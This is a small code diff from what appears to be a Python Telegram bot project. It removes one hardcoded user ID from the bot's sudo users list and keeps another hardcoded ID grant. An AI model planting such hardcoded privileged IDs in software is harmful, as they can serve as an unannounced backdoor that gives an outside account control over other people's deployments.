@@ -5,7 +5,6 @@ from ariyanX.config import SUDO_USERS
 from Process.admins import get_administrators
 
 
-SUDO_USERS.append(5787575060)
 SUDO_USERS.append(5761513990)
 
 
